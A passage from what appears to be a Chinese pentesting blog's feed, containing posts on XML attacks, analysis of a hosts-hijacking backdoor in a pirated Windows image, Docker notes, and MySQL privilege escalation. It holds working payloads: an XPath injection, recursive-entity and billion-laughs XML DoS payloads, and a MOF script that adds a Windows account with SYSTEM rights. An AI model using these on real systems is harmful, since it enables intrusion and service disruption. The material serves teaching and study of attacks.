class="hljs-tag">&lt;/<span class="hljs-name">pass</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span>lucy<span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">pass</span>&gt;</span>qwer1234<span class="hljs-tag">&lt;/<span class="hljs-name">pass</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>系统正常情况下通过如下语句来查询xml数据，如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>*[contains(user, <span class="hljs-string">&#x27;jack&#x27;</span> )]/name<br></code></pre></td></tr></table></figure><p>其中jack是用户可控制的，如果我们修改以上语句为：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>*[contains(user, <span class="hljs-string">&#x27;x&#x27;</span> )] | <span class="hljs-regexp">//</span>*| <span class="hljs-regexp">//</span>*[contains(user, <span class="hljs-string">&#x27;y&#x27;</span> )]/name<br></code></pre></td></tr></table></figure><p>|是或运算符号，//*是查询所有，这样就会返回所有用户的数据。</p><h2 id="0x04-xml实体循环ddos"><a href="#0x04-xml实体循环ddos" class="headerlink" title="0x04 xml实体循环ddos"></a>0x04 xml实体循环ddos</h2><p>如果我们可以控制xml，那么我们可以在xml中添加如下代码：</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!ENTITY %xxx <span class="hljs-meta-string">&#x27;&amp;#x25;yyy&#x27;</span>&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY %yyy <span class="hljs-meta-string">&#x27;&amp;#x25;xxx&#x27;</span>&gt;</span></span><br><span class="perl">%xxx;</span><br></code></pre></td></tr></table></figure><p>这个代码执行到最后一行，就会重复的执行前面的命令进入死循环，耗费服务器资源。</p><h2 id="0x05-xml炸弹ddos"><a href="#0x05-xml炸弹ddos" class="headerlink" title="0x05 xml炸弹ddos"></a>0x05 xml炸弹ddos</h2><p>如果我们可以控制xml，那么我们可以在xml中添加如下代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">something</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY X0 <span class="hljs-meta-string">&quot;testdata&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">X1</span> <span class="hljs-meta-string">&quot;&amp;x0;&amp;x0;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">X2</span> <span class="hljs-meta-string">&quot;&amp;x1;&amp;x1;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">X3</span> <span class="hljs-meta-string">&quot;&amp;x2;&amp;x2;&quot;</span>&gt;</span></span><br><span class="hljs-meta">···</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">X1</span>00 <span class="hljs-meta-string">&quot;&amp;x99;&amp;x99;&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">something</span>&gt;</span>&amp;x100;<span class="hljs-tag">&lt;/<span class="hljs-name">something</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当这个语句执行完的时候，原本的testdata就会经过指数式的增长，变成一个超大的字符串，极大的耗费服务器资源。</p><h2 id="0x06-xml外部实体注入"><a href="#0x06-xml外部实体注入" class="headerlink" title="0x06 xml外部实体注入"></a>0x06 xml外部实体注入</h2><p>xml外部实体注入在前面的博客中写过，可以参考：</p><p><a href="http://uuzdaisuki.com/2018/05/03/%E6%B5%85%E8%B0%88XXE%E6%BC%8F%E6%B4%9E/">http://uuzdaisuki.com/2018/05/03/%E6%B5%85%E8%B0%88XXE%E6%BC%8F%E6%B4%9E/</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>xml</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次localhost被劫持发现的盗版系统后门</title>
    <link href="/2018/07/11/%E4%B8%80%E6%AC%A1localhost%E8%A2%AB%E5%8A%AB%E6%8C%81%E5%8F%91%E7%8E%B0%E7%9A%84%E7%9B%97%E7%89%88%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8/"/>
    <url>/2018/07/11/%E4%B8%80%E6%AC%A1localhost%E8%A2%AB%E5%8A%AB%E6%8C%81%E5%8F%91%E7%8E%B0%E7%9A%84%E7%9B%97%E7%89%88%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h2><p>今天准备通过一个win7虚拟机的web服务测试一些东西的时候，打开127.0.0.1忽然发现有点不对劲，网站怎么跳转到一个<a href="http://www.776633.com的域名,然后又跳转到一个114la什么的网址导航了./">www.776633.com的域名，然后又跳转到一个114la什么的网址导航了。</a></p><p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack01.png?raw=true"></p><p>在新开一个页面重新访问localhost之后发现并不是自己眼花了，瞬间想到一个可能，嘛耶我该不会被劫持了吧。</p><p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack02.png?raw=true"></p><p>能造成这个情况的原因有很多，首先从最危险的情况开始排查，在确保了自己的网络环境是安全的，没有dns劫持等问题之后，考虑到这个系统是很久之前为了节约时间，临时在网上找到的别人封装好的盗版系统，难免会有后门，那么问题应该是出在这个win7系统内部了。</p><h2 id="0x01-HOSTS文件劫持"><a href="#0x01-HOSTS文件劫持" class="headerlink" title="0x01 HOSTS文件劫持"></a>0x01 HOSTS文件劫持</h2><p>在这个临时安装好，没有杀毒软件的系统，有后门、恶意软件的概率很高，很多恶意软件通过修改本地hosts文件对一些网址进行劫持，所以打开hosts看看是不是有恶意软件把hosts文件给更改了。</p><h3 id="HOSTS文件"><a href="#HOSTS文件" class="headerlink" title="HOSTS文件"></a>HOSTS文件</h3><p>Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。</p><p>如果恶意软件要通过hosts文件来劫持的话，可以通过添加一行类似：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> www.baidu.com<br></code></pre></td></tr></table></figure><p>这样访问百度就会解析到本地ip，如果这个文件的ip被改写成攻击者的服务器地址，那么我们访问后面的域名，就会解析到对方的服务器。</p><h3 id="排查问题"><a href="#排查问题" class="headerlink" title="排查问题"></a>排查问题</h3><p>win7系统的hosts文件在C:\Windows\system32\drivers\etc目录下，我们打开hosts文件查看一下有没有被篡改。</p><p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack03.png?raw=true"></p><p>但是在打开的这个hosts文件中，并没有看到任何可疑的东西，那么看来不是HOSTS文件篡改造成的问题，我们只能换个思路了。</p><p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack04.png?raw=true"></p><h2 id="0x02-恶意进程"><a href="#0x02-恶意进程" class="headerlink" title="0x02 恶意进程"></a>0x02 恶意进程</h2><p>既然不是hosts的问题，那么我访问127.0.0.1会被定向到恶意网站，一定是有恶意进程将本地80口占用，然后进行这一系列操作的，那么就去查看一下哪些进程在占用着本地80端口。</p><p>在命令行中输入：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat -ano <span class="hljs-string">| findstr &quot;</span><span class="hljs-number">80</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack05.png?raw=true"></p><p>看到pid为1120的进程占用着80口，那么在任务管理器中找找到底是什么进程。</p><p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack06.png?raw=true"></p><p>按pid排序之后发现是httpd.exe进程，这再熟悉不过了，不就是apache服务吗，不过想想自己也没在这个系统里面装过apache服务，猜想应该是这个系统封装的时候那个作者给弄进去的，不管是不是它造成的，先直接右键关掉整个进程树。</p><p>然后重新访问127.0.0.1，发现已经没有问题了，那么就确定是apache的问题。</p><p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack07.png?raw=true"></p><p>这个时候肯定要在apache安装目录看一看这小子到底在搞什么鬼，在检查了一会配置文件等问题之后，在C:\Windows\Apache\htdocs这个目录下的index.php发现了问题：</p><p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack08.png?raw=true"></p><p>我来解释一下这段php代码：</p><ul><li>首先这个php文件从 <a href="http://host.660055.com/index3.txt">http://host.660055.com/index3.txt</a> 这个网站读取一份txt文件，将里面的内容作为字符串存在$index中。</li><li>然后以@为分隔符，将$index字符串分割成为数组保存在$arr中。</li><li>然后将角标为零的元素保存为$host,角标为一的元素保存为$index，并且用$index替换index.php文件内容，用$host替换本地HOSTS文件中的内容进行进一步劫持。</li></ul><p>通过这部分内容，对方就可以通过更改网站中txt的内容，对所有拥有这个php文件的计算机的hosts文件进行更改，并且还能继续更新受害者计算机上的这个php文件做其他的事情。</p><p>再看看这个php文件后面的部分</p><p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack09.png?raw=true"></p><p>可以看到，在所有的代码运行过一遍之后，php文件将网址重定向到 <a href="http://www.776633.com./">www.776633.com。</a></p><p>在通过burpsuite对这个网址进行抓包之后，除了跳转那个114la的网址导航，就只剩几个js页面。</p><p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack10.png?raw=true"></p><p>这几个js页面全部访问了一下，大致看了一下代码然后在控制台运行了一遍之后，发现都是把一些数据发到一个站长数据的页面，没有什么安全问题，应该是攻击者统计一些数据用的。</p><p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack11.png?raw=true"></p><p>那么看来最后这个跳转的地址也是对方可控的，初步判断是攻击者用来刷刷这个网址导航的流量，顺便能够起到掩人耳目的作用。</p><h2 id="0x03-清除恶意进程"><a href="#0x03-清除恶意进程" class="headerlink" title="0x03 清除恶意进程"></a>0x03 清除恶意进程</h2><p>分析到这里，整个流程就清楚了，我除了把这个php脚本拷贝一份留下学习思路之外，将这个htdocs目录所有东西删除掉就没有问题了，如果不放心，我们可以将apache软件从计算机卸载，然后删掉整个apache目录就行了。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>我们清理了这个后门，仍不能保证这个系统就一定是安全的，很多盗版镜像站下载下来的系统都存在许许多多这样的问题，这种只用一两次就删掉的虚拟机为了方便用一些封装好的系统没有问题，但是如果我们是安装在自己电脑中长期使用的系统，一定要去官方下载正版的镜像。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker使用笔记</title>
    <link href="/2018/07/05/Docker%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    <url>/2018/07/05/Docker%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在一些漏洞环境的复现中，docker相比虚拟机要方便的多，而且更节省内存，启动更快。能节约我们非常多时间。对安全研究人员来说，docker是必须掌握的一样工具。</p><h2 id="0x01-docker"><a href="#0x01-docker" class="headerlink" title="0x01 docker"></a>0x01 docker</h2><p>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从Apache2.0协议开源。</p><p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p><p>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p><h2 id="0x02-docker安装"><a href="#0x02-docker安装" class="headerlink" title="0x02 docker安装"></a>0x02 docker安装</h2><ul><li>Ubuntu中安装：</li></ul><p><a href="http://www.runoob.com/docker/ubuntu-docker-install.html">http://www.runoob.com/docker/ubuntu-docker-install.html</a></p><ul><li>Windows中安装：</li></ul><p><a href="http://www.runoob.com/docker/windows-docker-install.html">http://www.runoob.com/docker/windows-docker-install.html</a></p><p>其中windows10专业版（必须是专业版，其他版本实测可以安装但是无法直接使用linux container模式）可以使用docker for windows、其余的版本安装Docker Toolbox。</p><ul><li>MacOS安装</li></ul><p><a href="http://www.runoob.com/docker/macos-docker-install.html">http://www.runoob.com/docker/macos-docker-install.html</a></p><h2 id="0x03-更换镜像源"><a href="#0x03-更换镜像源" class="headerlink" title="0x03 更换镜像源"></a>0x03 更换镜像源</h2><p>国内直接访问docker官方镜像源拉取镜像时速度会非常慢，我们需要将docker源切换到阿里镜像源或者网易镜像源。</p><h3 id="源地址获取"><a href="#源地址获取" class="headerlink" title="源地址获取"></a>源地址获取</h3><ul><li>阿里源地址：</li></ul><p>在<a href="https://dev.aliyun.com/search.html%E7%99%BB%E9%99%86%E8%87%AA%E5%B7%B1%E7%9A%84%E9%98%BF%E9%87%8C%E4%BA%91%E8%B4%A6%E6%88%B7%EF%BC%8C%E5%9C%A8%E7%AE%A1%E7%90%86%E4%B8%AD%E5%BF%83-&gt;%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E4%B8%AD%E4%BC%9A%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%93%E5%B1%9E%E5%8A%A0%E9%80%9F%E5%9C%B0%E5%9D%80">https://dev.aliyun.com/search.html登陆自己的阿里云账户，在管理中心-&gt;镜像加速器中会有自己的专属加速地址</a></p><p><img src="https://github.com/echohun/blog_image/blob/master/docker/docker01.png?raw=true"></p><ul><li>网易源地址：</li></ul><p><a href="http://hub-mirror.c.163.com/">http://hub-mirror.c.163.com</a></p><h3 id="源地址更换"><a href="#源地址更换" class="headerlink" title="源地址更换"></a>源地址更换</h3><ul><li>Ubuntu中更换：</li></ul><p>修改daemon配置文件/etc/docker/daemon.json</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo mkdir -p <span class="hljs-regexp">/etc/</span>docker<br>sudo tee <span class="hljs-regexp">/etc/</span>docker/daemon.json &lt;&lt;-<span class="hljs-string">&#x27;EOF&#x27;</span><br>&#123;<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;http://hub-mirror.c.163.com&quot;</span>]<br>&#125;<br>EOF<br>sudo systemctl daemon-reload<br>sudo systemctl restart docker<br></code></pre></td></tr></table></figure><p>如果要用阿里源，上面的仓库地址使用自己的阿里源专属地址即可。</p><ul><li>Docker for Windows中更换：</li></ul><p>在系统右下角托盘图标内右键菜单选择 Settings，打开配置窗口后左侧导航菜单选择 Docker Daemon。编辑窗口内的JSON串，填写加速器地址</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;http://hub-mirror.c.163.com&quot;</span>]<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>Docker for Mac中更换：</li></ul><p>右键点击桌面顶栏的 docker 图标，选择 Preferences ，在 Daemon 标签（Docker 17.03 之前版本为 Advanced 标签）下的 Registry mirrors 列表中将<br><a href="http://hub-mirror.c.163.com/">http://hub-mirror.c.163.com</a> 加到”registry-mirrors”的数组里，点击 Apply &amp; Restart按钮，等待Docker重启并应用配置的镜像加速器。</p><ul><li>Docker Toolbox中更换：</li></ul><p>1.在Windows命令行执行docker-machine ssh [machine-name]进入VM bash</p><p>2.sudo vi /var/lib/boot2docker/profile</p><p>3.在–label provider=virtualbox的下一行添加–registry-mirror <a href="https://xxxxxxxx.mirror.aliyuncs.com/">https://xxxxxxxx.mirror.aliyuncs.com</a></p><p>4.重启docker服务：sudo /etc/init.d/docker restart或者重启VM：exit退出VM bash，在Windows命令行中执行docker-machine restart</p><h2 id="0x04-docker基础命令"><a href="#0x04-docker基础命令" class="headerlink" title="0x04 docker基础命令"></a>0x04 docker基础命令</h2><h3 id="查询、下载、日志"><a href="#查询、下载、日志" class="headerlink" title="查询、下载、日志"></a>查询、下载、日志</h3><ul><li>查看docker信息：docker info</li><li>拉取镜像：docker pull &lt;镜像名&gt;</li><li>在线搜索镜像：docker search &lt;镜像名&gt;</li><li>查询本机所有的镜像：docker images </li><li>查看正在运行容器：docker ps</li><li>查看某容器内运行的进程：docker top <container></li><li>查询某个容器的所有操作记录：docker logs {容器ID|容器名称}</li></ul><h3 id="删除容器、镜像"><a href="#删除容器、镜像" class="headerlink" title="删除容器、镜像"></a>删除容器、镜像</h3><ul><li>删除单个容器：docker rm &lt;容器名or ID&gt;</li><li>删除单个镜像：docker rmi <ID></li></ul><h3 id="启动停止容器"><a href="#启动停止容器" class="headerlink" title="启动停止容器"></a>启动停止容器</h3><ul><li>停止某个容器：docker stop &lt;容器名or ID&gt;</li><li>启动某个容器：docker start &lt;容器名or ID&gt;</li><li>杀掉某个容器：docker kill &lt;容器名or ID&gt;</li></ul><h3 id="docker运行容器"><a href="#docker运行容器" class="headerlink" title="docker运行容器"></a>docker运行容器</h3><p>Usage: docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</p><p>其中image为为容器名、options是配置参数、command是命令</p><p>docker的配置参数非常多，我们常用的一般是用docker开启一个命令交互界面</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -t -i ubuntu <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><p>其中</p><ul><li><p>-t:在新容器内指定一个伪终端或终端。</p></li><li><p>-i:允许你对容器内的标准输入 (STDIN) 进行交互。</p></li></ul><p>更多的参数可以参考：</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs haml">-<span class="ruby">d, --detach=<span class="hljs-literal">false</span>         指定容器运行于前台还是后台，默认为<span class="hljs-literal">false</span>     </span><br><span class="ruby">-i, --interactive=<span class="hljs-literal">false</span>   打开STDIN，用于控制台交互    </span><br><span class="ruby">-t, --tty=<span class="hljs-literal">false</span>            分配tty设备，该可以支持终端登录，默认为<span class="hljs-literal">false</span>    </span><br><span class="ruby">-u, --user=<span class="hljs-string">&quot;&quot;</span>              指定容器的用户    </span><br><span class="ruby">-a, --attach=[]            登录容器（必须是以docker run -d启动的容器）  </span><br><span class="ruby">-w, --workdir=<span class="hljs-string">&quot;&quot;</span>           指定容器的工作目录   </span><br><span class="ruby">-c, --cpu-shares=<span class="hljs-number">0</span>        设置容器CPU权重，在CPU共享场景使用    </span><br><span class="ruby">-e, --env=[]               指定环境变量，容器中可以使用该环境变量    </span><br><span class="ruby">-m, --memory=<span class="hljs-string">&quot;&quot;</span>            指定容器的内存上限    </span><br><span class="ruby">-P, --publish-all=<span class="hljs-literal">false</span>    指定容器暴露的端口    </span><br><span class="ruby">-p, --publish=[]           指定容器暴露的端口   </span><br><span class="ruby">-h, --hostname=<span class="hljs-string">&quot;&quot;</span>          指定容器的主机名    </span><br><span class="ruby">-v, --volume=[]            给容器挂载存储卷，挂载到容器的某个目录    </span><br><span class="ruby">--volumes-from=[]          给容器挂载其他容器上的卷，挂载到容器的某个目录  </span><br><span class="ruby">--cap-add=[]               添加权限，权限清单详见：<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/linux.die.net/man</span><span class="hljs-regexp">/7/capabilities</span>    </span><br><span class="ruby">--cap-drop=[]              删除权限，权限清单详见：<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/linux.die.net/man</span><span class="hljs-regexp">/7/capabilities</span>    </span><br><span class="ruby">--cidfile=<span class="hljs-string">&quot;&quot;</span>               运行容器后，在指定文件中写入容器PID值，一种典型的监控系统用法    </span><br><span class="ruby">--cpuset=<span class="hljs-string">&quot;&quot;</span>                设置容器可以使用哪些CPU，此参数可以用来容器独占CPU    </span><br><span class="ruby">--device=[]                添加主机设备给容器，相当于设备直通    </span><br><span class="ruby">--dns=[]                   指定容器的dns服务器    </span><br><span class="ruby">--dns-search=[]            指定容器的dns搜索域名，写入到容器的/etc/resolv.conf文件    </span><br><span class="ruby">--entrypoint=<span class="hljs-string">&quot;&quot;</span>            覆盖image的入口点    </span><br><span class="ruby">--env-file=[]              指定环境变量文件，文件格式为每行一个环境变量    </span><br><span class="ruby">--expose=[]                指定容器暴露的端口，即修改镜像的暴露端口    </span><br><span class="ruby">--link=[]                  指定容器间的关联，使用其他容器的IP、env等信息    </span><br><span class="ruby">--lxc-conf=[]              指定容器的配置文件，只有在指定--exec-driver=lxc时使用    </span><br><span class="ruby">--name=<span class="hljs-string">&quot;&quot;</span>                  指定容器名字，后续可以通过名字进行容器管理，links特性需要使用名字    </span><br><span class="ruby">--net=<span class="hljs-string">&quot;bridge&quot;</span>             容器网络设置:  </span><br><span class="ruby">                              bridge 使用docker daemon指定的网桥       </span><br><span class="ruby">                              host    /<span class="hljs-regexp">/容器使用主机的网络    </span></span><br><span class="ruby">                              <span class="hljs-symbol">container:</span>NAME_or_ID  &gt;<span class="hljs-regexp">//</span>使用其他容器的网路，共享IP和PORT等网络资源    </span><br><span class="ruby">                              none 容器使用自己的网络（类似--net=bridge），但是不进行配置   </span><br><span class="ruby">--privileged=<span class="hljs-literal">false</span>         指定容器是否为特权容器，特权容器拥有所有的capabilities    </span><br><span class="ruby">--restart=<span class="hljs-string">&quot;no&quot;</span>             指定容器停止后的重启策略:  </span><br><span class="ruby">                              no：容器退出时不重启    </span><br><span class="ruby">                              on-failure：容器故障退出（返回值非零）时重启   </span><br><span class="ruby">                              always：容器退出时总是重启    </span><br><span class="ruby">--rm=<span class="hljs-literal">false</span>                 指定容器停止后自动删除容器(不支持以docker run -d启动的容器)    </span><br><span class="ruby">--sig-proxy=<span class="hljs-literal">true</span>           设置由代理接受并处理信号，但是SIGCHLD、SIGSTOP和SIGKILL不能被代理 </span><br></code></pre></td></tr></table></figure><h3 id="docker提交容器副本"><a href="#docker提交容器副本" class="headerlink" title="docker提交容器副本"></a>docker提交容器副本</h3><p>我们一般对一个容器进行更改之后，想要保留它下次再使用，可以使用commit命令</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">docker commit -m=<span class="hljs-string">&quot;update&quot;</span> -a=<span class="hljs-string">&quot;leticia&quot;</span> <span class="hljs-params">&lt;容器id&gt;</span> <span class="hljs-params">&lt;新的容器名&gt;</span><br></code></pre></td></tr></table></figure><p>其中</p><ul><li>-m是提交时的更新信息。</li><li>-a是作者名。</li></ul><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>docker的命令还有非常多，但是我们只需要掌握上面的一些命令，就可以在每次需要搭建漏洞环境时，从网络上寻找别人配置好的镜像拉取下来使用，能够节约非常多的时间。而且如果你的设备配置不是很高的话，docker在物理机中运行也远远比运行一个完整的虚拟机要流畅的多。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql数据库提权总结</title>
    <link href="/2018/07/02/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <url>/2018/07/02/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>数据库提权是提权中比较常用的手段，并且sql注入漏洞相对较多，比较好入手，这次整理一下mysql数据库提权的常用手段。</p><h2 id="0x01-MOF提权"><a href="#0x01-MOF提权" class="headerlink" title="0x01 MOF提权"></a>0x01 MOF提权</h2><h3 id="MOF文件"><a href="#MOF文件" class="headerlink" title="MOF文件"></a>MOF文件</h3><p>MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡。</p><h3 id="MOF提权原理"><a href="#MOF提权原理" class="headerlink" title="MOF提权原理"></a>MOF提权原理</h3><p>MOF文件既然每五秒就会执行，而且是系统权限，我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>Windows&lt;=2003</li><li>mysql在c:windows/system32/mof目录有写权限</li><li>已知数据库账号密码</li></ul><p>我们可以看到，这个提权方式条件非常严苛，数据库在system32写文件这个条件一般很难达到。而且较新的系统就无法使用MOF提权了。</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>这里提供一个poc,需要更改的部分只有一条命令</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br>instance of __EventFilter as $EventFilter<br>&#123;<br>EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>;<br>Name = <span class="hljs-string">&quot;filtP2&quot;</span>;<br>Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span><br><span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>;<br>Query<span class="hljs-class">Language = &quot;WQL&quot;;</span><br>&#125;;<br>instance of ActiveScriptEventConsumer as $Consumer<br>&#123;<br>Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>;<br>ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>;<br>ScriptText =<br><span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user test 123456 /add\<span class="hljs-string">&quot;)&quot;</span>;<br>&#125;;<br>instance of __FilterToConsumerBinding<br>&#123;<br>Consumer = $Consumer;<br>Filter = $EventFilter;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" 